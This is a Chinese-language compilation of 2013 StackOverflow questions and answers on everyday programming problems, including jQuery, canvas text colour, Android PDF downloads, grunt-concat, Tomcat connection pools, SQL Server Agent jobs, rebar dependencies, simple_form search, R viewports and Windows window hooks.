# StackOverflow 问答 15750000-15750999

# jquery - 输入 Jquery 意外结束

> ID：15750001
> 
> 赞同：0
> 
> 时间：2013-04-01T19:11:21.657
> 
> 标签：jquery, input, syntax-error

我收到此错误，但我在发布前检查了所有括号 20 次。会不会有别的问题？谢谢！！！

```
var ifBlock = function (options) {
    var options1 = options['entry']
    var options2 = options['condition']
    if (options1 != null && options2 != null) {
        return eval("VB.interpreter.dictionary["+options1+"]" + " " + options2)
    } else {
        return false
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:16:30.457

[通过http://jsbeautifier.org/](http://jsbeautifier.org/)运行您的整个代码并检查您是否在整个脚本中缺少一些括号（您可能是）。

# javascript - Javascript 函数 document.getElementById()

> ID：15750002
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:11:21.940
> 
> 标签：javascript, html, html-table, getelementbyid

我试图创建一个函数，通过使用传递给函数的参数（表名）来更改表的样式。我不确定我的代码有什么问题，如下所示，我是否正确使用了下面的参数。参数是表的实际名称。它似乎不起作用。我试过把它放在引号中，使用`$`但它似乎不起作用。我使用不正确吗？

```
<script language='JavaScript' type='text/javascript'>
    function sizeTbl(table) 
    {                                           
        var tbl = document.getElementById(table);

        if(tbl.style.display == 'table-row')
        {
            tbl.style.display = 'none';
        }
        else
        {
            tbl.style.display = 'table-row';
        }
    }
</script> 
```

我使用以下方法调用此函数：

```
<a href='javascript:sizeTbl("tbl0")'>View</a> 
```

或者

```
<a href='javascript:sizeTbl("tbl1")'>View</a> 
```

等等

我正在尝试使用此函数在表中显示和隐藏其他行。该表与下表类似：

```
<table>
    <tr><a href='javascript:sizeTbl(tb10)'>Click Here to show the hidden row</a></tr> 
    <tr id="tbl0" style='display:none'><td>Initially Hidden Row</td></tr>;
</table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:16:32.390

你会想使用 getElementbyName

```
 function sizeTbl(table) 
    {                                           
        var tbl= document.getElementsByName(table)[0];

        if(tbl.style.display == 'table-row')
        {
            tbl.style.display = 'none';
        }
        else
        {
            tbl.style.display = 'table-row';
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:15:59.643

您对该函数的调用应该有一个用引号括起来的参数：

```
<a href='javascript:sizeTbl("tbl0")'>View</a>
                            ^    ^ 
```

# javascript - Javascript使一个单词不可编辑到文本区域

> ID：15750006
> 
> 赞同：3
> 
> 时间：2013-04-01T19:11:26.157
> 
> 标签：javascript

我有一个基本的文本区域。我需要一个 javascript 函数，它将一个词（即 #default ）写入这个文本区域，并且只会使这个词不可编辑。textarea 的其余部分应保持正常可写。只有通过 javascript 定义的词不能由用户编辑。有没有办法在 IE7 上也可以使用？

感谢您的支持。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:36:26.003

您可以尝试添加`text-indent`到文本区域，然后为主题标签提供绝对位置。我不确定它是否适用于 IE7，但这里有一个适用于 Chrome 和 Firefox 的示例：http: [//jsfiddle.net/c5ZKk/](http://jsfiddle.net/c5ZKk/)

HTML：

```
<div class="hashtag">#hashtag</div>
<textarea>editable text</textarea> 
```

CSS：

```
body, textarea {
    font: 14px/1.5 Arial, sans-serif;
}

.hashtag {
    position: absolute;
    color: #aaa;
    margin: 6px 0 0 5px;
}

textarea {
    margin: 0;
    padding: 5px;
    text-indent: 62px;
    width: 300px;
    height: 200px;
} 
```

# android - Android浏览器不会下载pdf文件

> ID：15750012
> 
> 赞同：6
> 
> 时间：2013-04-01T19:11:58.733
> 
> 标签：android, asp.net-mvc, pdf, download

我有一个网络应用程序，可让用户下载 pdf 文件。它是 ASP.NET MVC，在桌面浏览器、iPhone、Android Chrome 和覆盖 Web 视图 setDownloadListener() 的原生 Android 应用程序中都可以正常工作。

但是，使用默认的 Android 浏览器时，下载似乎不起作用。我正在运行 4.2.2 的 Galaxy Nexus 和运行 2.3.7 的 Nexus S 4g 上进行测试。我在两台设备上都安装了 PDF 查看器应用程序。

当我在 Android Chrome 中进行测试时，用户会看到“开始下载...”toast，然后状态栏中会显示下载完成通知。用户可以触摸此通知以在 pdf 查看器中打开文件。在 Android 的默认浏览器中，没有 toast，也没有保存下载文件。

我将wireshark 放在网络上，我看到以下请求：

```
GET /appapth/ViewPDF/8383600280757433_11_05_2012 HTTP/1.1
Host: 192.168.1.117
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
X-Requested-With: com.google.android.browser
User-Agent: Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Accept-Encoding: gzip,deflate
Accept-Language: en-US
Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7
Cookie: (lots o'cookie data) 
```

回应是：

```
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Type: application/pdf
Content-Encoding: gzip
Expires: -1
Server: Microsoft-IIS/7.5
Set-Cookie: ___TempData=; path=/
Set-Cookie: ___TempData=(lot's o'cookie data); path=/; HttpOnly
Date: Mon, 01 Apr 2013 18:22:20 GMT
Content-Length: 48244

......YQ.....T...?J.h)...!E.S(lots o'binary data) 
```

正如您从跟踪应用程序/pdf 内容中看到的那样已下载。您还可以看到我没有使用 content-disposition 标头，并且响应是使用 gzip 编码下载的。

关于为什么这在默认 Android 浏览器上不起作用的任何想法？用户无权访问下载的数据，也没有启动查看器（或意图）。响应只是默默地忽略。（我猜Android默认浏览器需要内容配置或者不喜欢下载的Gzip，但我只是在猜测）

更新 - -

我删除了执行 Gzip 压缩的操作过滤器，并在 Content-Disposition 附件标题中添加。所以，我的控制器中的 MVC 代码就像：

```
public virtual ActionResult ViewPDF(string id)
{
    try
    {
        byte[] pdf = GetPDFContent(id);
        FileContentResult fcr = new FileContentResult(pdf, "application/pdf");
        fcr.FileDownloadName = id + ".pdf";            
        return fcr;
    } 
```

现在的 Http 响应是：

```
HTTP/1.1 200 OK 
Cache-Control: no-cache, no-store, must-revalidate 
Pragma: no-cache 
Content-Type: application/pdf 
Expires: -1 
Server: Microsoft-IIS/7.5 
Content-Disposition: attachment; filename=433_07_05_2012.pdf 
Set-Cookie: ___TempData=; path=/ 
Set-Cookie: ___TempData=(lots o'cookie data);path=/; HttpOnly 
Date: Mon, 01 Apr 2013 19:56:07 GMT 
Content-Length: 59069

%PDF-1.3 %.... 13 0 obj << (lots o'binary pdf data) 
```

不再有任何 gzip 并且有内容配置，但在 Android 默认浏览器上仍然没有可见的下载。

更新 2 ---

尝试了来自[https://stackoverflow.com/a/5728859/90236](https://stackoverflow.com/a/5728859/90236)和[http://winzter143.blogspot.com/2012/03/android-handling-of-content-disposition.html](http://winzter143.blogspot.com/2012/03/android-handling-of-content-disposition.html)和[http://androidforums 的建议。 com/application-development/256987-android-phone-download-issue-asp-net-website.html](http://androidforums.com/application-development/256987-android-phone-download-issue-asp-net-website.html)但我仍然得到相同的结果。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T13:36:31.033

找到了我自己的答案，它比我正在寻找的地方简单得多。我的带有下载链接的页面位于 iframe 中。如果在 iframe 中出现，Android 默认浏览器中的某些内容会丢失您的下载。我将 target="_blank" 添加到启动下载的标签中，现在一切正常。

这是一些示例代码来演示问题和修复。

```
<html>
<head><title>Test page</title></head>
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<body>
    <a href="http://www.adobe.com/products/eulas/pdfs/Photoshop_On_a_Server_Policy_5-31-2011.pdf">
        Download sample pdf</a><br />
    <iframe src="inner.html" />
</body>
</html> 
```

和inner.html：

```
<html>
<head><title>test iframe</title></head>
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<body>
    <p>This does NOT work on Android default browser.
    <a href="http://www.adobe.com/products/eulas/pdfs/Photoshop_On_a_Server_Policy_5-31-2011.pdf">
    Download sample pdf within iframe</a></p>

    <p><a href="http://www.adobe.com/products/eulas/pdfs/Photoshop_On_a_Server_Policy_5-31-2011.pdf"
    target="_blank">Download sample pdf within iframe with target</a>.</p>
</body>
</html> 
```

# javascript - 在 HTML5 上更改 fillText() 的颜色

> ID：15750013
> 
> 赞同：38
> 
> 时间：2013-04-01T19:11:58.787
> 
> 标签：javascript, html, html5-canvas

我正在尝试更改画布上每行消息的颜色，但到目前为止还没有成功。我已经尝试为它们中的每一个创建变量，但仍然没有运气。任何帮助，将不胜感激。

```
function initiate(){
    var elem = document.getElementById("canvas");
    canvas = elem.getContext("2d");
    addEventListener("mousemove", animation);

    canvas.shadowColor = "rgba(0, 0, 0, 0.5)";
    canvas.shadowOffsetX = 4;
    canvas.shadowOffsetY = 4;
    canvas.shadowBlur = 5;

    canvas.font = "bold 24px verdana, sans-serif ";
    var welcomeMessage ="Welcome to the store!";
    canvas.textAlign = "start";
    canvas.textBaseline = "bottom";
    canvas.fillText(welcomeMessage, 400, 50);

    canvas.font = "bold 14px verdana, sans-serif";
    var message2 = "Your favorite store for videos games and latest DVDs!"; 
    canvas.textAlign = "start";
    canvas.textBaseline = "bottom";
    canvas.fillText(message2, 400, 100);

    canvas.font = "bold 12px verdana, sans-serif";
    canvas.textAlign = "start";
    canvas.textBaseline = "bottom";
    // Create gradient
    //var gradient=canvas.createLinearGradient(0,0,c.width,0);
    //gradient.addColorStop("0","magenta");
    //gradient.addColorStop("0.5","blue");
    //gradient.addColorStop("1.0","red");
    //canvas.fillStyle = gradient;
    canvas.fillText(" <-- Move your mouse aroud to interact with Macroplay smily!", 400, 250);

} 
```

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2013-04-01T19:27:06.747

您必须设置文本的颜色。

像这样的东西：

```
const canvasObj = document.getElementById('canvas')
const context = canvasObj.getContext('2d')

context.font = "bold 24px verdana, sans-serif ";
var welcomeMessage = "Welcome to the store!";
context.textAlign = "start";
context.textBaseline = "bottom";
context.fillStyle = "#ff0000"; //<======= here
context.fillText(welcomeMessage, 10, 50);

context.font = "bold 14px verdana, sans-serif";
var message2 = "Your favorite store for videos games and latest DVDs!";
context.textAlign = "start";
context.textBaseline = "bottom";
context.fillStyle = "#00ff00"; //<======= and here
context.fillText(message2, 10, 100);
```

```
<canvas id="canvas" width="400" height="100"></canvas>
```

此外，将上下文变量命名为“context”或“cxt”而不是“canvas”可能是个好主意。它会不那么令人困惑:)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-04-01T19:27:21.860

您是否尝试过简单的填充样式，例如：

```
 canvas.fillStyle = "#ff00ff"; 
```

上的文本渲染`<canvas>`可能不支持高级填充样式。

只需在呈现每条消息之前设置新的 fillStyle。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2020-10-15T03:29:40.790

利用

```
canvas.fillStyle = "steelblue"; 
```

# android - 获取视图中的空指针

> ID：15750014
> 
> 赞同：0
> 
> 时间：2013-04-01T19:11:58.973
> 
> 标签：android, view, nullpointerexception

```
Bitmap bitmap;
View v1 = l1.getRootView();
v1.setDrawingCacheEnabled(true);
bitmap = Bitmap.createBitmap(v1.getDrawingCache());
v1.setDrawingCacheEnabled(false); 
```

对我不起作用：

```
bitmap = Bitmap.createBitmap(v1.getDrawingCache()); 
```

正在造成强制关闭。

我正在使用一个`LinearLayout`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:23:42.683

如果 v1.getDrawingCache() 返回 null，您需要启用绘图缓存。 [http://developer.android.com/reference/android/view/View.html#getDrawingCache(boolean)](http://developer.android.com/reference/android/view/View.html#getDrawingCache(boolean))

# svn - Subversion 版本化远程代码

> ID：15750016
> 
> 赞同：0
> 
> 时间：2013-04-01T19:11:59.347
> 
> 标签：svn, directory, repository, project, remote-server

我已经设置了一个 svn 服务器。我需要将项目代码放在与 svn 的服务器不同的子网中的另一台机器上。

就是这样：这个服务器设置了颠覆，保存了来自许多项目的大量代码。我需要将代码放在与 svn 服务器不同的机器上，以允许访问托管在不同子网中的 LDAP 服务器。每次我向 svn 服务器的机器提交新代码时，我都使用了一个技巧，将代码检查到这台机器上。我的问题是，是否有任何方法可以让 svn 远程管理这台机器上的代码，而不是在其自身上创建一个本地目录存储库。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T21:01:25.717

如果您真的想镜像**存储库**，而不仅仅是工作副本，请查看`svnsync`. 但是，您仍然需要在两者之间建立有效的网络连接。另请注意，镜像是只读的。

触发同步的方法有很多：

1.  通常的方法是从 master 上的 post-commit 挂钩调用它。如果您正常调用同步，即同步调用，用户可能会注意到提交需要更长的时间，因为必须等到同步完成。如果您的连接速度很快，这可能不是什么大问题，但是，如果您正在同步到远程站点或多个镜像，则可能会很烦人。
2.  为避免这种延迟，您可以异步执行同步。在 Unix 上，这就像`&`在命令中附加 a 一样简单。在 Windows 上，我无法让它工作。
3.  或者，您可以在主服务器或从服务器上运行一个小脚本，`synsync`每 n 秒运行一次。由于不必要的同步，这将导致一些额外的网络负载，并且从站的更新速度会慢一些，但这在您的情况下可能是可以接受的。

# javascript - grunt-concat 分隔符选项？

> ID：15750017
> 
> 赞同：12
> 
> 时间：2013-04-01T19:12:03.027
> 
> 标签：javascript, configuration, build, concatenation, gruntjs

如何在这种情况下指定分隔符：
我以这种方式将我的文件与 grunt-concat 连接起来：

```
concat: {
  options: {
    banner: '<%= banner %>',
    separator: ""
  },
  dist: {
    files:{
      '<%= distdir %>/public/scripts/ieditor.js': [
        'public/scripts/ieditor/vars.js',
        'public/scripts/ieditor/controllers/*.js',
        'public/scripts/ieditor/directives/*.js',
        'public/scripts/ieditor/app.js',
        'public/scripts/ieditor/services/*.js',
        'public/scripts/ieditor/filters/*.js'
      ],
      '<%= distdir %>/public/scripts/dashboard.js': [
        'public/scripts/dashboard/vars.js',
        'public/scripts/dashboard/controllers/*.js',
        'public/scripts/dashboard/directives/*.js',
        'public/scripts/dashboard/app.js',
        'public/scripts/dashboard/services/*.js',
        'public/scripts/dashboard/filters/*.js'
      ]
    }
  }
} 
```

我想要的是在连接 CSS 文件时将最终结果映射到原始文件，如指南针。
例子：

```
//####public/scripts/ieditor/vars.js###############
content of public/scripts/ieditor/vars.js
//####public/scripts/ieditor/controllers/a.js######
content of public/scripts/ieditor/controllers/a.js
//####public/scripts/ieditor/controllers/b.js######
content of public/scripts/ieditor/controllers/b.js
..... 
```

那么引用当前连接的文件的名称是什么，所以我可以在选项区域中执行类似的操作：

```
 options: {
    banner: '<%= banner %>',
    separator: "<%= current_file_name %>"
  }, 
```

提前致谢。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-09-12T15:29:59.227

[`process`指定为 function](https://github.com/gruntjs/grunt-contrib-concat#custom-process-function)的选项是您的朋友：

```
concat: {
  options: {
    process: function(src, filepath) {
      return '//####' + filepath + '\n' + src;
    }
  }
},
... 
```

# java - Tomcat中的连接池与单例？

> ID：15750020
> 
> 赞同：1
> 
> 时间：2013-04-01T19:12:09.533
> 
> 标签：java, tomcat, singleton, datasource

我在运行在 Tomcat 上的 Web 应用程序中使用连接池。我按照这里给出的设置[http://tomcat.apache.org/tomcat-7.0-doc/jndi-resources-howto.html#Adding](http://tomcat.apache.org/tomcat-7.0-doc/jndi-resources-howto.html#Adding)

当我需要连接时，我正在调用 servlet 的每个请求中的以下代码

```
 Context initCtx = new InitialContext();
        Context envCtx = (Context) initCtx.lookup("java:comp/env");
        DataSource ds = (DataSource)
        envCtx.lookup("jdbc/myDBName");
        con = ds.getConnection(); 
```

我应该将 ds 对象初始化为单例并从该对象获取连接，而不是一遍又一遍地获取 ds 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:37:00.993

是的，JNDI 查找可能相对昂贵，特别是如果您要一遍又一遍地进行查找。您可以在 Servlet 的 init() 方法中查找 DataSource 对象一次，然后将其存储在一个字段中，以便稍后在 service()/doPost()/doGet() 方法中使用它。

只需确保在 Servlet 的 destroy() 方法中的 DataSource 之后关闭/清理即可。

# javascript - 未应用 jQuery 移动样式

> ID：15750025
> 
> 赞同：0
> 
> 时间：2013-04-01T19:12:22.550
> 
> 标签：javascript, jquery, cordova, jquery-mobile, mobile

我正在尝试创建一个动态可折叠列表。数据正在通过 ajax 并很好地列出，但是`jQuery`没有应用移动样式，我不知道如何纠正这个问题。我已经尝试了一些我在互联网上找到的东西，但似乎没有任何效果。这是我正在使用的代码。

```
function button_directory(){
section_directory = document.getElementById("section_directory");
$("#display_area").fadeOut("slow", function(){
    display_area.innerHTML = "";
    title_bar.innerHTML = "DIRECTORY";

    $("#display_area").fadeIn("slow", function(){
    });

    var directoryURL = protocol + domain + "query.php?sid="+code;
    $.ajax({
        url: directoryURL,
        dataType: "json",
        success: function(members) {
            if(members.length > 0) {
                temp = '<div data-role="collapsible-set" id="collapsible">';
                $.each(members, function(index, value) {
                    temp +=
                        '<div data-role="collapsible" data-collapsed="true">'+                       
                            '<h3>'+value.firstName+' '+value.lastName+' - '+value.title+'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'+value.type+'</h3>'+
                            '<p><strong>Company:</strong> '+value.company+'<br>'+
                            '<strong>territory:</strong> '+value.territory+'<br>'+
                            '<strong>Clients:</strong> '+value.clients+'</p>'+
                        '</div>';
                });
                temp +='</div>';
                display_area.innerHTML = temp;
                $("#collapsible").trigger("create");

                //$("#display_area").find("div[data-role=collapsible]").collapsible();

                //$("#display_area").trigger('create');
            } else {
                return false;
            }
        }
    });
}); 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:01:19.360

您是否尝试过查看 jQuery 1.3 文档？

看看[http://api.jquerymobile.com/collapsible/#event-create](http://api.jquerymobile.com/collapsible/#event-create)看看它是否有帮助

# c# - 如何停止运行而不运行的 SQL Server 作业

> ID：15750026
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:12:24.037
> 
> 标签：c#, sql, jobs

我刚刚创建了一个控制台应用程序，它将由 Job 每天启动。这是一个概念证明。我的主要目的是检查数据库中的一些记录。这个证明只是一个控制台应用程序，它在 HD 中创建一个带有时间戳的文件。像这样

```
class Program
{
    static void Main(string[] args)
    {
        WriteToFile();
    }

    static void WriteToFile()
    {
        StreamWriter SW;
        DateTime invocationTime = DateTime.Now;
        SW = File.CreateText("c:\\HelloJobOutput\\MyTextFile"+invocationTime.Millisecond.ToString()+".txt");
        SW.WriteLine("I was created at:" + invocationTime.ToString());

        SW.Close();

    }
} 
```

该作业未分类，因为我不知道这意味着什么，我对作业调度真的很陌生。操作系统 cmdExec 类型的作业只有一个步骤，其命令是控制台应用程序可执行文件的完整路径，并计划在全天每 10 秒运行一次。成功时，它会退出报告成功。

怎么了？好吧，我开始工作，它开始运行良好，文件被创建并且时间戳是好的，然后我关闭工作执行对话框窗口，文件继续每 10 秒左右创建一次。所以我去管理工作室并停止工作，但它抛出一个错误，说它无法停止，因为它没有运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T16:24:22.090

[nkvu - 将其从评论中移出，因为它可能会变得详细/不可读。另外，我会尽力解释，但很高兴有更正/编辑，因为我不是专家。]

[SQL Server 代理](http://msdn.microsoft.com/en-us/library/ms189237.aspx)是一个单独的Windows 服务，它运行您定义的作业，如果它们没有被禁用并且有一个活动的计划（例如，在您的情况下每 10 秒）。因为它作为 Windows 服务运行，并且为此目的是独立的，所以您不需要任何手动干预即可让您的作业运行 - SQL Server 代理将检查活动作业及其计划，并在适当时自动启动作业（在这种情况下每 10 秒一次）。

这里的关键是，如果一个作业有一个活动的计划，它并不*意味着*它正在运行，只是它能够运行。如果我们跟踪这些步骤（我已经在每个步骤旁边描述了作业所在的“状态”）：

1.  作业已定义、已启用并有计划**（作业活动、未运行）**
2.  计划激活（按 10 秒间隔）并且 SQL Server 代理使用您提供的任何定义启动您的作业，在这种情况下，它启动一个控制台应用程序 HelloJob.exe **（正在运行的作业）**
3.  例如，假设您的控制台应用程序需要 5 秒来执行**（作业运行 5 秒）**
4.  作业完成是因为 10 秒的间隔我们有一段时间，比如 5 秒，在下一次运行之前**（作业活动，未运行/静止）**
5.  计划激活，SQL Server 代理再次启动您的作业**（运行中）**

在上面，您的作业实际上仅被认为在步骤 3 中的 5 秒间隔内运行，并且只会报告为运行了 5 秒。`Stop`此外，这是通过 Management Studio 的选项可以发挥作用的唯一时间段。

此外，`Start`它不启动您的计划运行的选项是什么，但它存在，例如，如果您的 DBA 需要在其正常/常规计划之外一次性运行作业（或者如果有一个作业只需要在极少数情况下手动运行）。作为一个场景，假设我有一个工作，每晚 @ 11 点运行一次，将表的内容转储到 CSV 文件以供另一个应用程序获取，但我第二天早上来（错误，这里没有监控场景）并看到没有创建 CSV 文件...然后我可以去工作并手动运行它来创建 CSV。

如果您的 DBA 需要：

*   停止执行当前正在运行的计划作业（例如，在 5 秒间隔内），然后他们可以使用`Stop`.
*   如果他们确实需要阻止作业运行，则禁用它或删除为作业定义的计划（可能还有其他方法，但这些是我熟悉的方法）

希望有帮助。

# git - 来自 github 的 Erlang git 存储库依赖项（undef）

> ID：15750029
> 
> 赞同：2
> 
> 时间：2013-04-01T19:12:28.210
> 
> 标签：git, github, erlang, libraries, rebar

我正在尝试运行一个调用

```
erl -sname egs -pa apps/*/ebin -pa deps/*/ebin -boot start_sasl -s ex_reloader -s egs 
```

调用脚本时遇到此错误

```
{"init terminating in do_boot",{undef,[{ex_reloader,start,[],[]},{init,start_it,1,[]},{init,start_em,1,[]}]}} 
```

在我的 rebar.config 文件中，代码如下所示

第一个 rebar.config 的代码

```
{sub_dirs, [
    "apps/egs",
    "apps/egs_patch",
    "apps/prs"
]}.
{dialyzer_opts, [src, {warnings, [
    behaviours,
    error_handling,
    race_conditions,
    unmatched_returns
%%  underspecs
]}]}.
{erl_opts, [
%%  bin_opt_info,
%%  warnings_as_errors,
    warn_export_all
]}. 
```

第二个 rebar.config 的代码

```
{deps, [
    {ex_reloader, ".*", {git, "https://github.com/extend/ex_reloader.git", "HEAD"}},
    {cowboy, ".*", {git, "https://github.com/extend/cowboy.git", "HEAD"}}
]}. 
```

是否有任何理由说明存储库未定义的原因。我应该安装其他软件包以便 git 依赖项工作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:16:47.800

看起来您需要先运行`rebar get-deps`，才能将依赖项实际下载到`deps`目录中。（然后`rebar compile`，编译它们。这是一个递归命令。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T21:39:39.837

我在您的帮助和另一篇文章中弄清楚了。我需要下载钢筋库。我使用此链接下载 [1]：[http](http://packages.ubuntu.com/raring/i386/rebar) ://packages.ubuntu.com/raring/i386/rebar然后我在正确的目录中使用了以下命令。

将应用程序添加到 rebar.config 并使用：

> 钢筋更新-deps

用于更新。第一次，您需要使用：

> rebar get-deps

然后编译依赖项，使用：

> 钢筋编译

现在，进入下一个错误......

# ruby-on-rails - 无法让 rails 搜索表单与 simple_form 和 sunspot 一起使用

> ID：15750030
> 
> 赞同：5
> 
> 时间：2013-04-01T19:12:29.630
> 
> 标签：ruby-on-rails, search, simple-form, sunspot, railscasts

我有一个简单的 Rails 应用程序，它使用 simple_form gem 作为表单，我正在尝试使用 sunspot 设置搜索表单。我已按照 Ryan Bates 的 railscast 中关于设置太阳黑子的说明进行操作，除了我知道我没有使用 simple_form 助手并且我想使用这一事实外，它工作正常。这是搜索表单的代码：

来自 _search.html.erb：

```
<%= form_tag rules_path, :method => :get do |f| %>
<%= text_field_tag :search, params[:search] %>
<%= submit_tag "Search", :name => nil %>
<% end %> 
```

来自 rules_controller.rb：

```
def index
  @search = Rule.search do
    fulltext params[:search]
  end
  @rules = @search.results

  respond_to do |format|
    format.html # index.html.erb
    format.json { render json: @rules }
  end
end 
```

就像我提到的那样，这暂时有效，但问题是：

**如何更改 _search.html.erb 以使用 simple_form 格式？**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-07-24T19:54:25.113

我可以通过为表单提供`symbol`与输入相同的名称并指定 URL 来使其工作。查看您`form_tag`生成的 URL 以及`simple_form_for`仅使用路径生成的内容。所以在你的表单中试试这个：

```
<%= simple_form_for :search,  url: rules_path , :method => :get do |f| %>
    <%= f.input :query, :autofocus => true %>
    <%= f.submit "Search" %>
<% end %> 
```

如果这不起作用，请研究您的`form_tag`产品并尝试使用 simple_form 复制它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-06-24T18:31:44.040

为此，我使用 simple_form 的下一个方法：

**1\. 定义一个表单（我用的是haml）**

```
=simple_form_for :search, url: search_path(:search), :method => :get  do |f|
 =f.input :q
 =f.submit "Search" 
```

**2.在routes.rb中定义一个路由**

```
get '/jobs/search/:q', :to => 'jobs#search', :as => :search 
```

**3.在你的控制器中定义一个方法（在我的例子中是jobs_controller.rb）**

```
 def search
   @search = params[:search][:q]
  end 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T19:28:33.320

您是否尝试过以下方法：

```
<%= simple_form_for rules_path, :method => :get do |f| %>
  <%= f.input :search %>
  <%= f.button :submit %>
<% end %> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-01-08T18:43:33.437

使用我的指南获取 simple_form 就地搜索框与 AJAX 一起使用：[http ://rexstjohn.com/in-place-ajax-search-box-with-ruby-simple_form-gem/](http://rexstjohn.com/in-place-ajax-search-box-with-ruby-simple_form-gem/)

# r - 使用推送视口在图形中重叠

> ID：15750036
> 
> 赞同：0
> 
> 时间：2013-04-01T19:12:41.327
> 
> 标签：r, plot, viewport, bioconductor

我正在尝试使用以下代码将两个数字绘制到一个 PDF 上：

```
ncols <- 1
nrows <- 2
grid.newpage()
pushViewport(viewport(layout = grid.layout(nrows, ncols)))
for (i in seq_along(chroms)) {
pushViewport(viewport(layout.pos.col = 1, layout.pos.row = 1))
plotTracks(list(itrack, gtrack, dTrack),
    chromosome = chr1, add = TRUE)
pushViewport(viewport(layout.pos.col = 1, layout.pos.row = 2))
plotTracks(list(biomTrack, gtrack2),
    chromosome = chr1, add = TRUE)
popViewport(1)
} 
```

问题是，这两个数字重叠了！（并且图中的row2仍然是空的）

我希望新鲜的眼睛会抓住我的错误。我究竟做错了什么？

*编辑以反映@DINRE 的评论*

```
ncols <- 1
nrows <- 2
grid.newpage()
pushViewport(viewport(layout = grid.layout(nrows,
+     ncols)))
for (i in seq_along(chroms)) {
pushViewport(viewport(layout.pos.col = 1, layout.pos.row = 1))
plotTracks(list(itrack, gtrack, dTrack),
    chromosome = chr1, add = TRUE)
**popViewport(1)** ## NEED TO POP OUT FIRST ROW BEFORE PLOTTING SECOND.
pushViewport(viewport(layout.pos.col = 1, layout.pos.row = 2))
plotTracks(list(biomTrack, gtrack2),
    chromosome = chr1, add = TRUE)
popViewport(1)
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:25:43.000

底行的视口被推入顶行的视口。首先弹出顶行的视口似乎可以解决问题。

*注意：对于视口来说，这是一个非常常见的错误，所以如果它发生在您身上，请不要感到难过。*

# windows - 检测/挂钩窗口移动/拖动其他外部进程

> ID：15750038
> 
> 赞同：3
> 
> 时间：2013-04-01T19:12:44.397
> 
> 标签：windows, hook, setwindowshookex, setwindowlong

检测其他进程的窗口移动/拖动的最佳方法是什么？在 Windows7 64 位

我目前正在使用 C++ 和 C# 调查来自 DLL 的全局挂钩。这是一种痛苦，因为它不想正常工作。我在键盘和鼠标挂钩方面取得了一些成功。但是对于窗口消息，我只是不知道出了什么问题。

这是我的 .dll 文件中的代码

```
#include <windows.h>
#include <iostream>
#include <stdio.h>

HINSTANCE hinst;
#pragma data_seg(".shared")
HHOOK hhk;
WNDPROC realProc;
#pragma data_seg()
//#pragma comment(linker, "/SECTION:.shared,RWS") compiler error in VC++ 2008 express

LRESULT CALLBACK wireKeyboardProc(int code, WPARAM wParam,LPARAM lParam) {  
    //open the standard out stream for writing
    freopen("CONOUT$","w+t", stdout);
    printf("code:%d wparam:%d lparam:%d\n", code, wParam, lParam);

    /*
    if (code < 0) {
        return CallNextHookEx(0, code, wParam, lParam);
    }
    */
    //Beep(1000, 20);

    return CallNextHookEx(hhk, code, wParam, lParam);
}

LRESULT CALLBACK hookProc(HWND h, UINT msg, WPARAM wp, LPARAM lp)
{
    //open the standard out stream for writing
    freopen("CONOUT$","w+t", stdout);
    printf("h:%d msg:%d wp:%d lp:%d\n", h, msg, wp, lp);
    return CallWindowProc(realProc, h, msg, wp, lp);
}

extern "C" __declspec(dllexport) void install(unsigned long threadId, HWND hwnd) {
    //open the standard out stream for writing
    freopen("CONOUT$","w+t", stdout);

    //works for WH_KEYBOARD WH_MOUSE but doesnt work for WH_CALLWNDPROC
    hhk = SetWindowsHookEx(WH_CALLWNDPROC, wireKeyboardProc, hinst, threadId);
    printf("threadId: %d xxx: %d\n", threadId, hhk);

    /*
    //dont know whats wrong the return value of realProc is 0
    realProc = (WNDPROC)SetWindowLongPtr(hwnd, GWL_WNDPROC, (LONG_PTR)hookProc);
    printf("hwnd: %d xxx: %d\n", hwnd, realProc);
    */
}

extern "C" __declspec(dllexport) void uninstall() {
    UnhookWindowsHookEx(hhk); 
}

BOOL WINAPI DllMain(__in HINSTANCE hinstDLL, __in  DWORD fdwReason, __in  LPVOID lpvReserved) {
    hinst = hinstDLL;
    return TRUE;
} 
```

我正在考虑制作自己的 Aero Snap。这只是为了好玩。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-02T12:59:01.403

经过一番额外的谷歌搜索后，我发现了一个几乎完全符合我要求的开源项目。

[http://sourceforge.net/projects/powerresizer/](http://sourceforge.net/projects/powerresizer/)

